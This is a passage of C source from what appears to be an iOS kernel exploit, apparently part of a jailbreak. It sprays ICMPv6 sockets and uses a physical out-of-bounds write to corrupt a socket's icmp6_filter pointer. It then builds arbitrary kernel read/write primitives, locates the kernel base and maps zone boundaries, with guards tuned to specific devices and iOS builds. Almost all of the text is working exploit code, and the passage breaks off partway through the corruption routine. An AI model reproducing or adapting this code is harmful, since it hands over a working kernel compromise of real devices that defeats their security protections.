        /* Rate-limit: only log first 5 occurrences to avoid log spam during scans */
        static int s_misalign_log_count = 0;
        if (++s_misalign_log_count <= 5) {
            pe_log("set_target_kaddr: BLOCKED misaligned addr 0x%llx (count=%d)", where, s_misalign_log_count);
        }
        if (g_proc_read_scope_depth > 0 && !g_proc_scope_block_latched && ++g_proc_scope_block_count >= k_proc_scope_block_trip_threshold) {
            g_proc_scope_block_latched = true;
            pe_log("set_target_kaddr: PANIC GUARD tripped in proc-scope after %d blocked candidates", g_proc_scope_block_count);
        }
        return false;
    }
    if (where >= 0xffffffff00000000ULL) {
        pe_log("set_target_kaddr: BLOCKED addr >= 0xffffffff: 0x%llx", where);
        return false;
    }
    /* Kernel text/data range is always safe */
    if (where >= 0xfffffff000000000ULL) {
        /* OK — kernel text/data */
    }
    /* Zone map range: use dynamic bounds if discovered */
    else if (g_zone_map_min && g_zone_map_max) {
        if (where < g_zone_map_min || where >= g_zone_map_max) {
            pe_log("set_target_kaddr: BLOCKED addr outside zone_map [0x%llx,0x%llx): 0x%llx",
                   g_zone_map_min, g_zone_map_max, where);
            if (g_proc_read_scope_depth > 0 && !g_proc_scope_block_latched && ++g_proc_scope_block_count >= k_proc_scope_block_trip_threshold) {
                g_proc_scope_block_latched = true;
                pe_log("set_target_kaddr: PANIC GUARD tripped in proc-scope after %d blocked candidates", g_proc_scope_block_count);
            }
            return false;
        }

        /* Bug #418: avoid sparse/unallocated zone pages that can panic in
         * metadata validation path (Kernel data abort with FAR in Metadata).
         *
         * Use the same guarded heap window as utils chain-walk validators:
         * - lower bound: g_zone_safe_min (skip VM/RO + sparse low zone)
         * - upper bound: zone_map_max - 4MB (skip unstable top tail)
         */
        const uint64_t ZONE_TOP_GUARD = 0x400000ULL;
        uint64_t zone_guard_max = (g_zone_map_max > ZONE_TOP_GUARD) ?
                                  (g_zone_map_max - ZONE_TOP_GUARD) :
                                  g_zone_map_max;
        uint64_t zone_guard_min = g_zone_safe_min ? g_zone_safe_min : g_zone_map_min;
        if (g_proc_read_scope_depth > 0 && g_zone_safe_min) {
            /* Bug #427: on 21D61 some valid proc/allproc chain links sit below
             * g_zone_safe_min by ~1-3GB. During scoped proc traversal, widen the
             * guarded low bound down by 4GB (clamped to zone_map_min). Keep the
             * same upper top-tail guard and all other checks unchanged. */
            const uint64_t PROC_SCOPE_LOW_WIDEN = 0x100000000ULL; /* 4GB */
            uint64_t scoped_min = (g_zone_safe_min > PROC_SCOPE_LOW_WIDEN)
                                ? (g_zone_safe_min - PROC_SCOPE_LOW_WIDEN)
                                : g_zone_map_min;
            if (scoped_min < g_zone_map_min) {
                scoped_min = g_zone_map_min;
            }
            zone_guard_min = scoped_min;
        }
        if (zone_guard_min >= zone_guard_max || where < zone_guard_min || where >= zone_guard_max) {
            pe_log("set_target_kaddr: BLOCKED zone addr outside guarded window [0x%llx,0x%llx): 0x%llx",
                   zone_guard_min, zone_guard_max, where);
            if (g_proc_read_scope_depth > 0 && !g_proc_scope_block_latched && ++g_proc_scope_block_count >= k_proc_scope_block_trip_threshold) {
                g_proc_scope_block_latched = true;
                pe_log("set_target_kaddr: PANIC GUARD tripped in proc-scope after %d blocked candidates", g_proc_scope_block_count);
            }
            return false;
        }

        /* Bug #419: constrain speculative zone derefs to a sane vicinity of
         * the proven live object (rw_socket_pcb). Some junk pointers can still
         * look zone-valid numerically yet resolve into sparse/unbacked regions,
         * triggering copyout metadata aborts during ourproc() chain walk.
         *
         * Keep a default ±4GB window around rw_socket_pcb. Bug #423 allows
         * validated proc/allproc traversal to widen this via a scoped override
         * (Bug #426: ±12GB on 21D61) while preserving zone_guard_min/max and
         * top-tail checks. */
        if (rw_socket_pcb >= g_zone_map_min && rw_socket_pcb < g_zone_map_max) {
            uint64_t zone_anchor_span = (g_proc_read_scope_depth > 0)
                                      ? 0x300000000ULL /* 12GB */
                                      : 0x100000000ULL; /* 4GB */
            uint64_t anchor_min = (rw_socket_pcb > zone_anchor_span) ?
                                  (rw_socket_pcb - zone_anchor_span) : g_zone_map_min;
            /* Bug #447: in proc-scope, allow any zone-valid address up to zone_guard_max.
             * On 21D61 A12Z the allproc chain can contain proc structs up to ~14GB above
             * rw_socket_pcb (near the top of the 24GB zone_map). The ±12GB upper limit
             * caused disc_pl layout discovery to accumulate 32 "blocked" reads from these
             * high-address procs, tripping PANIC GUARD and aborting before ourproc() could
             * walk the chain. Apply the span-based upper limit only outside proc-scope. */
            uint64_t anchor_max;
            if (g_proc_read_scope_depth > 0) {
                anchor_max = zone_guard_max; /* full upper zone_map extent */
            } else {
                anchor_max = rw_socket_pcb + zone_anchor_span;
                if (anchor_max < rw_socket_pcb || anchor_max > zone_guard_max) {
                    anchor_max = zone_guard_max;
                }
            }
            if (anchor_min < zone_guard_min) {
                anchor_min = zone_guard_min;
            }
            if (anchor_min >= anchor_max || where < anchor_min || where >= anchor_max) {
                pe_log("set_target_kaddr: BLOCKED zone addr outside rw_socket_pcb anchor window [0x%llx,0x%llx) (rw=0x%llx): 0x%llx",
                       anchor_min, anchor_max, rw_socket_pcb, where);
                if (g_proc_read_scope_depth > 0 && !g_proc_scope_block_latched && ++g_proc_scope_block_count >= k_proc_scope_block_trip_threshold) {
                    g_proc_scope_block_latched = true;
                    pe_log("set_target_kaddr: PANIC GUARD tripped in proc-scope after %d blocked candidates", g_proc_scope_block_count);
                }
                return false;
            }
        }
    }
    /* Fallback: conservative static bound if zone discovery hasn't run yet.
     * After discover_zone_boundaries_raw() returns, g_zone_map_min/max are
     * ALWAYS non-zero.  This branch only fires for reads BEFORE discovery
     * (pcb offsets, kernel text lookups) — add BOTH bounds for safety. */
    else {
        prime_zone_bounds_from_rw_pcb("pre-zone-discovery");

        /* Bug #428: pre-zone-discovery reads were still allowed against a
         * very wide primed window (from rw_socket_pcb ±24GB), which can
         * include Zone Metadata/Bitmaps regions and trigger Kernel data abort
         * on copyout while probing early pointers.
         *
         * Before zone_info is actually discovered, enforce a tighter anchor
         * around the proven live object. Keep this independent from proc-scope
         * traversal widening (Bug #426/#427), which applies only after real
         * zone bounds are established. */
        if (rw_socket_pcb >= 0xffffffd000000000ULL && rw_socket_pcb < 0xfffffff000000000ULL) {
            const uint64_t PRE_DISCOVERY_ANCHOR_SPAN = 0x300000000ULL; /* 12GB */
            uint64_t pre_anchor_min = (rw_socket_pcb > PRE_DISCOVERY_ANCHOR_SPAN)
                                    ? (rw_socket_pcb - PRE_DISCOVERY_ANCHOR_SPAN)
                                    : 0xffffffd000000000ULL;
            uint64_t pre_anchor_max = rw_socket_pcb + PRE_DISCOVERY_ANCHOR_SPAN;
            if (pre_anchor_max < rw_socket_pcb || pre_anchor_max > 0xfffffff000000000ULL) {
                pre_anchor_max = 0xfffffff000000000ULL;
            }
            if (where < pre_anchor_min || where >= pre_anchor_max) {
                pe_log("set_target_kaddr: BLOCKED pre-discovery addr outside rw_socket_pcb anchor window [0x%llx,0x%llx) (rw=0x%llx): 0x%llx",
                       pre_anchor_min, pre_anchor_max, rw_socket_pcb, where);
                return false;
            }
        }

        if (g_zone_map_min && g_zone_map_max) {
            if (where < g_zone_map_min || where >= g_zone_map_max) {
                pe_log("set_target_kaddr: BLOCKED addr outside primed zone_map [0x%llx,0x%llx): 0x%llx",
                       g_zone_map_min, g_zone_map_max, where);
                return false;
            }
        } else {
        /* Upper bound defense: block addresses above reasonable zone_map_max.
         * rw_socket_pcb + 24GB is the absolute ceiling for any zone alloc. */
        uint64_t static_max = 0xffffffe800000000ULL; /* conservative default */
        if (rw_socket_pcb >= 0xffffffd000000000ULL && rw_socket_pcb < 0xfffffff000000000ULL) {
            static_max = rw_socket_pcb + ZONE_MAP_SPAN;
            if (static_max > 0xfffffff000000000ULL) static_max = 0xfffffff000000000ULL;
        }
        /* Lower bound: On devices where zone_map starts at 0xffffffe2..., Zone
         * Metadata/Bitmaps reside at 0xffffffdd... and are NOT mapped — accessing
         * them causes Kernel data abort (ESR 0x96000007).  Hard lower bound
         * 0xffffffe000000000 was designed for that layout.
         *
         * BUG #211 / A12Z iOS 17.3.1: On this device the zone_map itself starts
         * in the 0xffffffdd... region — rw_socket_pcb (validated by gencnt check)
         * is direct evidence that 0xffffffdd... IS mapped and IS in zone_map.
         * Using 0xffffffe000000000 as the floor blocks ALL valid PCB reads.
         *
         * Fix: if pcb is below 0xffffffe0, derive the floor from pcb itself
         * (64KB-page-aligned), which we KNOW is safe since the PCB was validated. */
        uint64_t zone_lower;
        if (rw_socket_pcb && rw_socket_pcb < 0xffffffe000000000ULL) {
            /* A12Z / early-zone layout: pcb is the proven safe floor */
            zone_lower = rw_socket_pcb & ~(uint64_t)0xffffULL; /* 64KB page floor */
        } else {
            /* Standard layout: zone_map starts at 0xffffffe0... */
            zone_lower = 0xffffffe000000000ULL;
        }
        if (where < zone_lower || where >= static_max) {
            pe_log("set_target_kaddr: BLOCKED addr 0x%llx (no zone bounds, zone_lower=0x%llx static_max=0x%llx)",
                   where, zone_lower, static_max);
            return false;
        }
        }
    }
    memset(control_data, 0, EARLY_KRW_LENGTH);
    *(uint64_t *)control_data = where;
    int res = setsockopt(control_socket, IPPROTO_ICMPV6, ICMP6_FILTER,
                          control_data, (socklen_t)EARLY_KRW_LENGTH);
    if (res != 0) { pe_log("setsockopt failed (set_target_kaddr)!"); return false; }
    return true;
}

static bool park_corrupted_socket_filter_target_to_self(void) {
    const uint64_t icmp6filt_offset = 0x148;

    if (control_socket < 0 || rw_socket < 0) {
        pe_log("abort-neutralize: skipped (control=%d rw=%d)", control_socket, rw_socket);
        return false;
    }
    if (!rw_socket_pcb) {
        pe_log("abort-neutralize: skipped (rw_socket_pcb=0)");
        return false;
    }

    uint64_t safe_target = rw_socket_pcb + icmp6filt_offset;
    if (!set_target_kaddr(safe_target)) {
        pe_log("abort-neutralize: failed to park corrupted filter target at self 0x%llx", safe_target);
        return false;
    }

    pe_log("abort-neutralize: parked corrupted filter target at self 0x%llx", safe_target);
    return true;
}

static bool early_kread_checked(uint64_t where, void *read_buf, uint64_t size) {
    if (size > EARLY_KRW_LENGTH) { pe_log("[!] error: size > EARLY_KRW_LENGTH"); return false; }
    if (!set_target_kaddr(where)) {
        memset(read_buf, 0, size);
        return false;
    }
    socklen_t read_data_length = (socklen_t)size;
    int res = getsockopt(rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER, read_buf, &read_data_length);
    /* sooptcopyout truncates to min(requested, actual) and reports back the
     * truncated size. For size<32, *optlen = size (not 32), so >= is equivalent
     * to ==. Using >= adds defense against kernels that might not truncate. */
    return (res == 0 && read_data_length >= size);
}

static void early_kread(uint64_t where, void *read_buf, uint64_t size) {
    if (!early_kread_checked(where, read_buf, size)) {
        pe_log("getsockopt failed (early_kread)!");
    }
}

static uint64_t early_kread64(uint64_t where) {
    uint64_t value = 0;
    early_kread(where, &value, 8);
    return value;
}

static bool early_kread_cstring(uint64_t where, char *buf, size_t bufsz) {
    if (!buf || bufsz < 2) return false;
    memset(buf, 0, bufsz);
    if (where < 0xfffffff000000000ULL) return false;
    if (!kread_length_checked(where, buf, bufsz - 1)) return false;

    bool saw_nul = false;
    for (size_t i = 0; i < bufsz - 1; i++) {
        unsigned char c = (unsigned char)buf[i];
        if (c == '\0') {
            saw_nul = true;
            break;
        }
        if (c < 0x20 || c > 0x7e) return false;
    }
    return saw_nul;
}

static bool is_expected_ipi_zone_name(const char *name) {
    if (!name || !*name) return false;
    /* Bug #224: iOS 17 zone names are longer, e.g.
     * "kalloc.type.site.struct inpcb" — our 32-byte read buffer
     * may capture a truncated form like "site.struct inpcb".
     * Use substring match for 'inpcb' to handle all variants. */
    if (strstr(name, "inpcb") != NULL) return true;
    return strcmp(name, "icmp6") == 0 ||
           strcmp(name, "ripcb") == 0 ||
           strcmp(name, "inp6") == 0 ||
           strcmp(name, "in6pcb") == 0 ||
           strcmp(name, "raw6") == 0 ||
           strcmp(name, "icmp6pcb") == 0;
}

static bool derive_kernel_base_via_protosw(uint64_t ctrl_pcb, uint64_t *out_kernel_base) {
    const uint64_t pcb_socket_offset      = 0x40;
    const uint64_t socket_so_proto_offset = 0x18;
    const uint64_t protosw_pr_input_off   = 0x28;

    uint64_t socket_ptr = pac_strip(early_kread64(ctrl_pcb + pcb_socket_offset));
    if (socket_ptr < 0xffffffd000000000ULL) {
        pe_log("kernel-base fallback: socket_ptr invalid: 0x%llx", socket_ptr);
        return false;
    }

    uint64_t proto_ptr = pac_strip(early_kread64(socket_ptr + socket_so_proto_offset));
    if (proto_ptr < 0xfffffff000000000ULL) {
        pe_log("kernel-base fallback: proto_ptr invalid: 0x%llx", proto_ptr);
        return false;
    }

    uint64_t text_ptr = pac_strip(early_kread64(proto_ptr + protosw_pr_input_off));
    if (text_ptr < 0xfffffff000000000ULL) {
        pe_log("kernel-base fallback: pr_input invalid: 0x%llx", text_ptr);
        return false;
    }

    uint64_t kbase = text_ptr & 0xFFFFFFFFFFFFC000ULL;
    for (int scan_i = 0; scan_i < 0x4000 && kbase >= 0xfffffff000000000ULL; scan_i++) {
        uint64_t magic = early_kread64(kbase);
        if (magic == 0x100000cfeedfacfULL) {
            uint64_t cpuinfo = early_kread64(kbase + 8);
            if (cpuinfo == 0xc00000002ULL || cpuinfo == 0xB00000000ULL) {
                if (out_kernel_base) *out_kernel_base = kbase;
                pe_log("kernel-base fallback: success via protosw->pr_input (socket=0x%llx proto=0x%llx text=0x%llx)",
                       socket_ptr, proto_ptr, text_ptr);
                return true;
            }
        }
        kbase -= PAGE_SZ;
    }

    pe_log("kernel-base fallback: Mach-O header not found from pr_input=0x%llx", text_ptr);
    return false;
}

static void early_kwrite32bytes(uint64_t where, void *write_buf) {
    if (!set_target_kaddr(where)) {
        pe_log("early_kwrite32bytes: BLOCKED write to 0x%llx", where);
        return;
    }
    int res = setsockopt(rw_socket, IPPROTO_ICMPV6, ICMP6_FILTER,
                          write_buf, (socklen_t)EARLY_KRW_LENGTH);
    if (res != 0) { pe_log("setsockopt failed (early_kwrite32bytes)!"); }
}

static void early_kwrite64(uint64_t where, uint64_t what) {
    early_kread(where, early_kwrite64_write_buf, EARLY_KRW_LENGTH);
    *(uint64_t *)early_kwrite64_write_buf = what;
    early_kwrite32bytes(where, early_kwrite64_write_buf);
}

static void kread_length(uint64_t address, void *buffer, uint64_t size) {
    uint64_t remaining = size, read_offset = 0, read_size = 0;
    while (remaining != 0) {
        read_size = (remaining >= EARLY_KRW_LENGTH) ? EARLY_KRW_LENGTH : remaining;
        early_kread(address + read_offset, (uint8_t *)buffer + read_offset, read_size);
        remaining   -= read_size;
        read_offset += read_size;
    }
}

static bool kread_length_checked(uint64_t address, void *buffer, uint64_t size) {
    uint64_t remaining = size, read_offset = 0, read_size = 0;
    while (remaining != 0) {
        read_size = (remaining >= EARLY_KRW_LENGTH) ? EARLY_KRW_LENGTH : remaining;
        if (!early_kread_checked(address + read_offset, (uint8_t *)buffer + read_offset, read_size)) {
            pe_log("getsockopt failed (early_kread)!");
            return false;
        }
        remaining   -= read_size;
        read_offset += read_size;
    }
    return true;
}

static void kwrite_length(uint64_t dst, void *src, uint64_t size) {
    uint64_t remaining = size, write_offset = 0, write_size = 0;
    while (remaining != 0) {
        write_size = (remaining >= EARLY_KRW_LENGTH) ? EARLY_KRW_LENGTH : remaining;
        uint64_t kwrite_dst_addr = dst + write_offset;
        uint8_t *kwrite_src_addr = (uint8_t *)src + write_offset;
        if (write_size != EARLY_KRW_LENGTH)
            kread_length(kwrite_dst_addr, kwrite_length_buffer, EARLY_KRW_LENGTH);
        memcpy(kwrite_length_buffer, kwrite_src_addr, write_size);
        early_kwrite32bytes(kwrite_dst_addr, kwrite_length_buffer);
        remaining    -= write_size;
        write_offset += write_size;
    }
}

/* ================================================================
   Runtime zone boundary discovery
   ================================================================
   Scans kernel memory near ipi_zone (in __DATA_CONST) for the
   zone_info global: two consecutive uint64_t where
     max − min == 0x600000000 (24 GB, XNU constant)
   and rw_socket_pcb is within [min, max).
   Also parses kernel Mach-O to verify __DATA_CONST bounds.
   ================================================================ */

static void discover_zone_boundaries_raw(uint64_t ipi_zone_addr) {
    if (!ipi_zone_addr || !rw_socket_pcb) {
        pe_log("zone discovery: SKIPPED (ipi_zone=0x%llx pcb=0x%llx)", ipi_zone_addr, rw_socket_pcb);
        /* CRITICAL: MUST set bounds even when skipping — otherwise
         * set_target_kaddr has NO upper bound and zone metadata
         * addresses in [0xffffffd0, 0xfffffff0) pass through! */
        if (rw_socket_pcb >= 0xffffffd000000000ULL && rw_socket_pcb < 0xfffffff000000000ULL) {
            /* Bug #224: use full ZONE_MAP_SPAN (24 GB) as emergency half-width.
             * struct socket can be ~11.5 GB away from struct inpcb, exceeding
             * the old ZONE_MAP_SPAN/3 (8 GB) window → BLOCKED → no refcount
             * bump → sockets freed during allproc scan → panic.
             * Bug #212 fix: do NOT clamp to 0xffffffe0 — on A12Z/iOS 17.3.1
             * zone_map starts at 0xffffffdd... so that clamp excludes ALL PCBs. */
            const uint64_t EMG_SPAN = ZONE_MAP_SPAN; /* 24 GB — full zone_map coverage */
            g_zone_map_min = (rw_socket_pcb > EMG_SPAN) ?
                             (rw_socket_pcb - EMG_SPAN) : 0xffffffd000000000ULL;
            g_zone_map_max = rw_socket_pcb + EMG_SPAN;
            if (g_zone_map_max > 0xfffffff000000000ULL)
                g_zone_map_max = 0xfffffff000000000ULL;
            /* Bug #225: skip VM+RO submaps even in emergency mode */
            g_zone_safe_min = g_zone_map_min + ZONE_MAP_SPAN / 4;
            if (g_zone_safe_min > g_zone_map_max) g_zone_safe_min = g_zone_map_min;
        } else {
            /* Last resort: conservative static bounds for unknown pcb layout */
            g_zone_map_min = 0xffffffd000000000ULL;
            g_zone_map_max = 0xffffffe800000000ULL;
            g_zone_safe_min = g_zone_map_min + ZONE_MAP_SPAN / 4;
        }
        pe_log("zone discovery: EMERGENCY bounds [0x%llx - 0x%llx] safe_min=0x%llx",
               g_zone_map_min, g_zone_map_max, g_zone_safe_min);
        return;
    }

    /* ipi_zone_addr points into zone_array[] in __DATA_CONST.
     * zone_info is defined before zone_array in zalloc.c.
     * Search backwards up to 128 KB, then forwards up to 64 KB. */

    const uint64_t CHUNK = 0x4000ULL;       /* 16 KB */
    const uint64_t BACK  = 0x400000ULL;     /* 4 MB backward */
    /* CRITICAL: forward scan is limited to 2 MB to avoid reading into the
     * kernel TEXT_EXEC region (execute-only pages on arm64e iOS 17+).
     * On T8020/A12X, ipi_zone is in __DATA_CONST and TEXT_EXEC starts
     * ~3.9 MB forward.  copyout() from execute-only pages causes a
     * kernel data abort (ESR 0x96000007, translation fault L3 read). */
    const uint64_t FWD   = 0x200000ULL;     /* 2 MB forward — safe before TEXT_EXEC */

    pe_log("zone discovery: ipi_zone=0x%llx rw_pcb=0x%llx", ipi_zone_addr, rw_socket_pcb);

    /* Search BACKWARDS from ipi_zone (most likely direction) */
    int back_chunks = 0;
    for (uint64_t dist = 0; dist < BACK; dist += CHUNK) {
        uint64_t addr = ipi_zone_addr - dist;
        addr &= ~(CHUNK - 1);  /* align down to page */
        if (addr < 0xfffffff000000000ULL) break;

        if (back_chunks % 16 == 0) {
            pe_log("zone scan backward: %lluKB / %lluKB", dist / 1024, BACK / 1024);
        }
        back_chunks++;

        uint8_t chunk[0x4000];
        kread_length(addr, chunk, sizeof(chunk));

        for (int j = 0; j < (int)(CHUNK - 8); j += 8) {
            uint64_t a = *(uint64_t *)(chunk + j);
            uint64_t b = *(uint64_t *)(chunk + j + 8);
            if (a < 0xffffffd000000000ULL || a >= 0xfffffff000000000ULL) continue;
            if (b <= a) continue;
            if ((b - a) != ZONE_MAP_SPAN) continue;
            if (rw_socket_pcb >= a && rw_socket_pcb < b) {
                g_zone_map_min = a;
                g_zone_map_max = b;
                /* Bug #225: skip VM+RO submaps (first ~20% of zone_map).
                 * Per-CPU allocations in VM submap cause:
                 *   panic: zone bound checks: address X is a per-cpu allocation
                 * GEN0 starts at ~zone_map_min + 20%; use 25% for safety margin. */
                g_zone_safe_min = a + ZONE_MAP_SPAN / 4;
                pe_log("zone_info FOUND at 0x%llx: zone_map [0x%llx - 0x%llx] safe_min=0x%llx",
                       addr + j, a, b, g_zone_safe_min);
                return;
            }
        }
    }

    pe_log("zone scan backward: done (%d chunks, not found). trying forward...", back_chunks);

    /* Search FORWARDS from ipi_zone (metadata may be above zone map) */
    int fwd_chunks = 0;
    for (uint64_t dist = CHUNK; dist <= FWD; dist += CHUNK) {
        uint64_t addr = (ipi_zone_addr + dist) & ~(CHUNK - 1);
        if (addr >= 0xffffffff00000000ULL) break;

        if (fwd_chunks % 16 == 0) {
            pe_log("zone scan forward: %lluKB / %lluKB", dist / 1024, FWD / 1024);
        }
        fwd_chunks++;

        uint8_t chunk[0x4000];
        kread_length(addr, chunk, sizeof(chunk));

        for (int j = 0; j < (int)(CHUNK - 8); j += 8) {
            uint64_t a = *(uint64_t *)(chunk + j);
            uint64_t b = *(uint64_t *)(chunk + j + 8);
            if (a < 0xffffffd000000000ULL || a >= 0xfffffff000000000ULL) continue;
            if (b <= a) continue;
            if ((b - a) != ZONE_MAP_SPAN) continue;
            if (rw_socket_pcb >= a && rw_socket_pcb < b) {
                g_zone_map_min = a;
                g_zone_map_max = b;
                g_zone_safe_min = a + ZONE_MAP_SPAN / 4;
                pe_log("zone_info FOUND (fwd) at 0x%llx: zone_map [0x%llx - 0x%llx] safe_min=0x%llx",
                       addr + j, a, b, g_zone_safe_min);
                return;
            }
        }
    }

    pe_log("WARNING: zone_info NOT found in ±4 MB around ipi_zone");
    pe_log("Falling back to conservative bounds based on rw_socket_pcb");
    /* Fallback: rw_socket_pcb is in zone_map.  Zone map is 24 GB.
     * Use pcb_addr ± ZONE_MAP_SPAN/3 (~8 GB) — tighter than ± 24 GB
     * to exclude zone metadata which typically lives within a few GB
     * of zone_map boundaries.  Some valid addresses at edges may be
     * rejected, but false-reject is vastly safer than false-accept
     * (which causes kernel data abort in unmapped metadata pages). */
    const uint64_t FALLBACK_SPAN = ZONE_MAP_SPAN / 3; /* ~8 GB */
    /* Bug #212 fix: do NOT clamp min to 0xffffffe0 — on A12Z/iOS 17.3.1
     * zone_map starts at 0xffffffdd..., so that clamp excludes the PCB itself.
     * rw_socket_pcb is a proven zone_map object (found via inp_list + gencnt
     * validation).  Floor = pcb - 8GB allows safe access to all zone objects
     * near the pcb.  We accept the small risk that zone metadata at the edge
     * of zone_map (< pcb - 8GB) might be hit, but that is far safer than
     * blocking ALL reads which makes the jailbreak completely non-functional. */
    g_zone_map_min = (rw_socket_pcb > FALLBACK_SPAN) ?
                     (rw_socket_pcb - FALLBACK_SPAN) : 0xffffffd000000000ULL;
    g_zone_map_max = rw_socket_pcb + FALLBACK_SPAN;
    if (g_zone_map_max > 0xfffffff000000000ULL)
        g_zone_map_max = 0xfffffff000000000ULL;
    /* Bug #225: safe_min skips VM+RO submaps (per-CPU zone elements) */
    g_zone_safe_min = g_zone_map_min + ZONE_MAP_SPAN / 4;
    if (g_zone_safe_min > g_zone_map_max) g_zone_safe_min = g_zone_map_min;
    pe_log("fallback zone bounds: [0x%llx - 0x%llx] safe_min=0x%llx",
           g_zone_map_min, g_zone_map_max, g_zone_safe_min);
}

/* ================================================================
   Socket spray
   ================================================================ */

static mach_port_t spray_socket(void) {
    int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
    if (fd == -1) { return (mach_port_t)-1; }

    if (socket_ports_count >= MAX_SOCKET_PORTS) {
        close(fd);
        pe_log("spray_socket: reached MAX_SOCKET_PORTS=%d", MAX_SOCKET_PORTS);
        return (mach_port_t)-1;
    }

    memset(socket_info, 0, sizeof(socket_info));
    errno = 0;
    int proc_info_size = (int)syscall(336, 3, getpid(), 3, fd, socket_info, 0x400);
    if (proc_info_size < 0) {
        int saved_errno = errno;
        close(fd);
        pe_log("spray_socket: proc_info syscall failed for fd=%d errno=%d (%s)",
               fd, saved_errno, strerror(saved_errno));
        return (mach_port_t)-1;
    }
    if (proc_info_size < (int)(0x110 + sizeof(uint64_t))) {
        close(fd);
        pe_log("spray_socket: proc_info returned short size=%d", proc_info_size);
        return (mach_port_t)-1;
    }

    mach_port_t output_socket_port = MACH_PORT_NULL;
    if (fileport_makeport(fd, &output_socket_port) != 0 || output_socket_port == MACH_PORT_NULL) {
        int saved_errno = errno;
        close(fd);
        pe_log("spray_socket: fileport_makeport failed errno=%d (%s)",
               saved_errno, strerror(saved_errno));
        return (mach_port_t)-1;
    }
    close(fd);

    uint64_t inp_gencnt = *(uint64_t *)(socket_info + 0x110);
    if (inp_gencnt == 0) {
        mach_port_deallocate(mach_task_self(), output_socket_port);
        pe_log("spray_socket: inp_gencnt is 0");
        return (mach_port_t)-1;
    }

    socket_ports[socket_ports_count]   = output_socket_port;
    socket_pcb_ids[socket_ports_count] = inp_gencnt;
    return output_socket_port;
}

static void sockets_release(void) {
    for (uint64_t sock_idx = 0; sock_idx < socket_ports_count; sock_idx++) {
        mach_port_deallocate(mach_task_self(), socket_ports[sock_idx]);
    }
    socket_ports_count = 0;
}

/* ================================================================
   Find a sprayed socket PCB in the physical OOB region and corrupt
   its icmp6_filter pointer → gives us arbitrary kernel R/W
   ================================================================ */

static int64_t find_and_corrupt_socket(mach_port_t memory_object, uint64_t seeking_offset,
                                        void *read_buffer, void *write_buffer,
                                        bool do_read)
{
    if (do_read && !physical_oob_read_mo_with_retry(memory_object, seeking_offset,
                                                    oob_size, oob_offset, read_buffer)) {
        pe_log("find_and_corrupt_socket: initial OOB read retry budget exhausted");
        return -1;
    }

    uint64_t search_start_idx = 0;
    bool target_found = false;
    uint64_t pcb_start_offset = 0;
    uint64_t icmp6filt_offset = 0x148;
    void *found = NULL;

    do {
        found = memmem((uint8_t *)read_buffer + search_start_idx,
                        oob_size - search_start_idx,
                        executable_name, strlen(executable_name));
        if (found) {
            pcb_start_offset = ((uint64_t)((uint8_t *)found - (uint8_t *)read_buffer)) & 0xFFFFFFFFFFFFFC00ULL;
            if (*(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + icmp6filt_offset + 8) == 0x0000ffffffffffffULL) {
                target_found = true;
                break;
            }
        }
        search_start_idx += 0x400;
    } while (found && search_start_idx < oob_size);

    if (target_found) {
        pe_log("pcb_start_offset: 0x%llx", pcb_start_offset);
        uint64_t target_inp_gencnt = *(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + 0x78);
        pe_log("target_inp_gencnt: 0x%llx", target_inp_gencnt);

        if (socket_ports_count == 0) {
            pe_log("no sprayed sockets recorded — retrying");
            return -1;
        }

        if (target_inp_gencnt == socket_pcb_ids[socket_ports_count - 1]) {
            pe_log("Found last PCB");
            return -1;
        }

        bool is_our_pcb = false;
        int64_t control_socket_idx = -1;
        for (uint64_t sock_idx = 0; sock_idx < socket_ports_count; sock_idx++) {
            if (socket_pcb_ids[sock_idx] == target_inp_gencnt) {
                is_our_pcb = true;
                control_socket_idx = (int64_t)sock_idx;
                break;
            }
        }
        if (!is_our_pcb) { pe_log("Found freed PCB Page!"); return -1; }

        for (int i = 0; i < target_inp_gencnt_count; i++) {
            if (target_inp_gencnt_list[i] == target_inp_gencnt) {
                pe_log("Found old PCB Page!");
                return -1;
            }
        }
        if (target_inp_gencnt_count >= MAX_GENCNT) {
            pe_log("exceeded MAX_GENCNT (%d) attempts", MAX_GENCNT);
            return -1;
        }
        target_inp_gencnt_list[target_inp_gencnt_count++] = target_inp_gencnt;

        uint64_t inp_list_next_pointer = pac_strip(*(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + 0x28)) - 0x20;
        uint64_t icmp6filter = *(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + icmp6filt_offset);
        pe_log("inp_list_next_pointer: 0x%llx", inp_list_next_pointer);
        pe_log("icmp6filter: 0x%llx", icmp6filter);

        /* SAFETY GUARD: zone memory on arm64e starts well above 0xffffffd0.
         * If the computed PCB pointer is below that, the struct offset 0x28 is
         * wrong for this iOS version and we'd panic in early_kread64. Bail out
         * cleanly so the caller can retry.
         */
        if (inp_list_next_pointer < 0xffffffd000000000ULL) {
            pe_log("GUARD: inp_list_next_pointer=0x%llx below zone range — struct offset mismatch, retrying", inp_list_next_pointer);
            return -1;
        }

        rw_socket_pcb = inp_list_next_pointer;
        g_corruption_snapshot_valid = true;
        g_corruption_snapshot_pcb = rw_socket_pcb;
        g_corruption_snapshot_filter_qword0 = *(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + icmp6filt_offset);
        g_corruption_snapshot_filter_qword1 = *(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + icmp6filt_offset + 8);

        memcpy(write_buffer, read_buffer, oob_size);
        *(uint64_t *)((uint8_t *)write_buffer + pcb_start_offset + icmp6filt_offset) = inp_list_next_pointer + icmp6filt_offset;
        *(uint64_t *)((uint8_t *)write_buffer + pcb_start_offset + icmp6filt_offset + 8) = 0;

        pe_log("Corrupting icmp6filter pointer...");
        bool corruption_stuck = false;
        for (int corrupt_try = 0; corrupt_try < 256; corrupt_try++) {
            physical_oob_write_mo(memory_object, seeking_offset, oob_size, oob_offset, write_buffer);
            if (!physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer)) {
                pe_log("find_and_corrupt_socket: verify read retry budget exhausted");
                return -1;
            }
            uint64_t new_icmp6filter = *(uint64_t *)((uint8_t *)read_buffer + pcb_start_offset + icmp6filt_offset);
            if (new_icmp6filter == inp_list_next_pointer + icmp6filt_offset) {
                pe_log("target corrupted: 0x%llx", new_icmp6filter);
                corruption_stuck = true;
                break;
            }
        }
        if (!corruption_stuck) {
            pe_log("icmp6filter corruption did not stick after 256 attempts");
            return -1;
        }

